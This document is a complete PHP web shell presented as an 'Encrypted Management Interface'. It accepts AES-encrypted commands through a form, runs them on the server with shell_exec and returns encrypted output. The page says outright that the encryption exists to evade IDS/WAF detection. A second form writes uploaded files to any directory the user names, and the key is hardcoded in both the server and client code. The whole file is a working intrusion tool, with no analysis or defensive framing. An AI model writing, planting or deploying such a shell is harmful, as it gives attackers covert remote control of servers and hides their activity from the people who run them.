<?php
// Initialize variables
$encrypted_b64 = '';
$decryption_error = '';
// Encryption configuration
$encryption_key = 'WktKZa4UsF8CMH14BOwBV0KHRA2CZoza';
$iv = '1234567890123456';
$cipher = 'aes-256-cbc';
// Check if encrypted command is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST" && !empty($_POST['encrypted_cmd']) && !isset($_FILES['fileToUpload'])) {
    try {
        // Decrypt the incoming command
        $encrypted_cmd_b64 = $_POST['encrypted_cmd'];
        $encrypted_cmd_bin = base64_decode($encrypted_cmd_b64);

        if ($encrypted_cmd_bin === false) {
            throw new Exception("Invalid base64 encoding");
        }

        // Decrypt command
        $decrypted_cmd = openssl_decrypt($encrypted_cmd_bin, $cipher, $encryption_key, OPENSSL_RAW_DATA, $iv);

        if ($decrypted_cmd === false) {
            throw new Exception("Failed to decrypt command: " . openssl_error_string());
        }

        // Execute the decrypted command
        $safe_cmd = escapeshellcmd($decrypted_cmd);

        // Thuc thi, redirect stderr -> stdout
        $raw_output = shell_exec($safe_cmd . ' 2>&1');

        // Clean output
        $clean_output = trim(isset($raw_output) ? $raw_output : 'No output');

        // Encrypt output
        $encrypted_bin = openssl_encrypt($clean_output, $cipher, $encryption_key, OPENSSL_RAW_DATA, $iv);

        if ($encrypted_bin === false) {
            throw new Exception("Failed to encrypt output: " . openssl_error_string());
        }

        // Convert to Base64 for transmission
        $encrypted_b64 = base64_encode($encrypted_bin);

    } catch (Exception $e) {
        $decryption_error = "Decryption/Execution Error: " . $e->getMessage();
        // Encrypt the error message too
        $encrypted_error = openssl_encrypt($decryption_error, $cipher, $encryption_key, OPENSSL_RAW_DATA, $iv);
        if ($encrypted_error !== false) {
            $encrypted_b64 = base64_encode($encrypted_error);
        }
    }
}

// File upload logic (unchanged)
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['fileToUpload'])) {
    $uploadedFile = $_FILES['fileToUpload'];
    $targetDir = isset($_POST['targetDir']) ? trim($_POST['targetDir']) : '';

    if (empty($targetDir)) {
        echo "Error: Target directory cannot be empty.";
        exit;
    }

    $isWindows = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';

    if ($isWindows) {
        $targetDir = str_replace('\\', '/', $targetDir);
        if (!preg_match('/^[A-Za-z]:\//', $targetDir)) {
            $targetDir = __DIR__ . '/' . ltrim($targetDir, '/');
        }
    } else {
        if (substr($targetDir, 0, 1) !== '/') {
            $targetDir = __DIR__ . '/' . ltrim($targetDir, '/');
        }
    }

    if ($isWindows) {
        $targetDir = str_replace('/', DIRECTORY_SEPARATOR, $targetDir);
    }

    if (!file_exists($targetDir)) {
        if (!mkdir($targetDir, 0777, true)) {
            die("Cannot create directory: " . htmlspecialchars($targetDir));
        }
    }

    if ($uploadedFile && $uploadedFile['error'] === UPLOAD_ERR_OK) {
        if (is_dir($targetDir)) {
            $targetFile = rtrim($targetDir, '/\\') . DIRECTORY_SEPARATOR . basename($uploadedFile['name']);

            if (move_uploaded_file($uploadedFile['tmp_name'], $targetFile)) {
                echo "File uploaded successfully to: " . htmlspecialchars($targetFile);
            } else {
                echo "Error moving uploaded file.";
            }
        } else {
            echo "Target directory is not valid: " . htmlspecialchars($targetDir);
        }
    } else {
        $error_messages = [
            UPLOAD_ERR_OK => 'No error',
            UPLOAD_ERR_INI_SIZE => 'File exceeds upload_max_filesize',
            UPLOAD_ERR_FORM_SIZE => 'File exceeds MAX_FILE_SIZE',
            UPLOAD_ERR_PARTIAL => 'File partially uploaded',
            UPLOAD_ERR_NO_FILE => 'No file uploaded',
            UPLOAD_ERR_NO_TMP_DIR => 'Missing temporary folder',
            UPLOAD_ERR_CANT_WRITE => 'Failed to write file',
            UPLOAD_ERR_EXTENSION => 'Extension stopped upload',
        ];
        $error_code = $uploadedFile['error'] ?? 'Unknown';
        echo "Upload error: " . ($error_messages[$error_code] ?? "Unknown error: $error_code");
    }
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>Encrypted Management Interface</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            line-height: 1.6;
            padding: 20px;
            background-color: #f5f5f5;
            max-width: 1200px;
            margin: 0 auto;
        }

        .container {
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
            margin-bottom: 20px;
        }

        .message {
            padding: 15px;
            margin: 15px 0;
            border-radius: 5px;
            border-left: 4px solid;
        }

        .info {
            background-color: #d1ecf1;
            color: #0c5460;
            border-left-color: #bee5eb;
        }

        .warning {
            background-color: #fff3cd;
            color: #856404;
            border-left-color: #ffeaa7;
        }

        input[type="text"],
        input[type="file"] {
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 14px;
        }

        input[type="submit"] {
            background-color: #007bff;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 14px;
        }

        input[type="submit"]:hover {
            background-color: #0056b3;
        }

        pre {
            background-color: #f8f9fa;
            border: 1px solid #e9ecef;
            border-radius: 4px;
            padding: 15px;
            overflow-x: auto;
            white-space: pre-wrap;
            word-wrap: break-word;
        }

        .encryption-status {
            font-size: 12px;
            color: #6c757d;
            margin-top: 5px;
        }
    </style>
</head>

<body>
    <div class="container">
        <h2>Encrypted Command Interface</h2>
        <div class="message info">
            <strong>Security Notice:</strong> All commands are encrypted before transmission to bypass IDS/WAF
            detection.
        </div>

        <form id="commandForm" method="POST">
            <input type="hidden" name="encrypted_cmd" id="encrypted_cmd">
            <div style="margin-bottom: 15px;">
                <input type="text" id="cmd" size="80" placeholder="Enter command (e.g., whoami, dir, ps aux)"
                    style="width: 70%;">
                <input type="submit" value="Execute Encrypted" style="margin-left: 10px;">
            </div>
            <div class="encryption-status">
                Status: <span id="encryption_status">Ready for encrypted transmission</span>
            </div>
        </form>

        <h3>Decrypted Output:</h3>
        <pre id="output-container">Waiting for command execution...</pre>
        <div class="encryption-status">
            Decryption Status: <span id="decryption_status">Standby</span>
        </div>
    </div>
    <script>
        // Encryption configuration
        const key = CryptoJS.enc.Utf8.parse('WktKZa4UsF8CMH14BOwBV0KHRA2CZoza');
        const iv = CryptoJS.enc.Utf8.parse('1234567890123456');
        // Form submission handler
        document.getElementById('commandForm').addEventListener('submit', function (e) {
            e.preventDefault();
            const cmd = document.getElementById('cmd').value.trim();
            if (!cmd) {
                alert('Please enter a command');
                return;
            }
            try {
                // Encrypt the command
                document.getElementById('encryption_status').textContent = 'Encrypting command...';
                const encrypted = CryptoJS.AES.encrypt(cmd, key, {
                    iv: iv,
                    mode: CryptoJS.mode.CBC,
                    padding: CryptoJS.pad.Pkcs7
                });
                const encryptedB64 = CryptoJS.enc.Base64.stringify(encrypted.ciphertext);
                document.getElementById('encrypted_cmd').value = encryptedB64;
                document.getElementById('encryption_status').textContent = 'Command encrypted, sending...';
                // Submit the form
                this.submit();
            } catch (e) {
                console.error('Encryption error:', e);
                document.getElementById('encryption_status').textContent = 'Encryption failed: ' + e.message;
            }
        });
        // Handle server response
        const encryptedData = <?php echo json_encode($encrypted_b64 ?: ''); ?>;
        const outputContainer = document.getElementById('output-container');
        const decryptionStatus = document.getElementById('decryption_status');
        if (encryptedData) {
            try {
                decryptionStatus.textContent = 'Decrypting server response...';
                // Decrypt server response
                const ciphertext = CryptoJS.enc.Base64.parse(encryptedData);
                const decryptedWA = CryptoJS.AES.decrypt(
                    { ciphertext: ciphertext },
                    key,
                    { iv: iv, mode: CryptoJS.mode.CBC, padding: CryptoJS.pad.Pkcs7 }
                );
                const decryptedUtf8 = decryptedWA.toString(CryptoJS.enc.Utf8);
                if (decryptedUtf8) {
                    outputContainer.textContent = decryptedUtf8;
                    decryptionStatus.textContent = 'Response decrypted successfully';
                } else {
                    outputContainer.textContent = 'Decryption succeeded but no output received';
                    decryptionStatus.textContent = 'Empty response';
                }
            } catch (e) {
                console.error("Decryption error:", e);
                outputContainer.textContent = "DECRYPTION FAILED! Error: " + e.message;
                decryptionStatus.textContent = 'Decryption failed';
            }
        } else {
            decryptionStatus.textContent = 'No encrypted data received';
        }
        // Clear input after execution
        if (encryptedData) {
            document.getElementById('cmd').value = '';
            document.getElementById('encryption_status').textContent = 'Ready for next encrypted command';
        }
    </script>
    <div class="container">
        <h2>File Upload Interface</h2>
        <div class="message warning">
            <strong>Examples:</strong><br>
            - Absolute path: <code>C:\xampp\htdocs\uploads</code><br>
            - Relative path: <code>uploads</code> (creates: current_dir/uploads)<br>
            - Current directory: <code>.</code>
        </div>
        <form method="post" enctype="multipart/form-data">
            <div style="margin-bottom: 15px;">
                <label>Select file to upload:</label><br>
                <input type="file" name="fileToUpload" required style="margin-top: 5px;">
            </div>
            <div style="margin-bottom: 15px;">
                <label>Target directory:</label><br>
                <input type="text" name="targetDir" placeholder="C:\xampp\htdocs\uploads or uploads" required
                    style="width: 60%; margin-top: 5px;">
            </div>
            <input type="submit" value="Upload File">
        </form>
    </div>
    <div class="container">
        <h3>Security Features</h3>
        <div class="message info">
            <strong>Implemented Security Measures:</strong><br>
            - Command encryption (Browser -> Server)<br>
            - Output encryption (Server -> Browser)<br>
            - AES-256-CBC symmetric encryption<br>
            - Base64 encoding for safe transmission<br>
            - File upload to arbitrary directories<br>
        </div>
    </div>
</body>

</html>
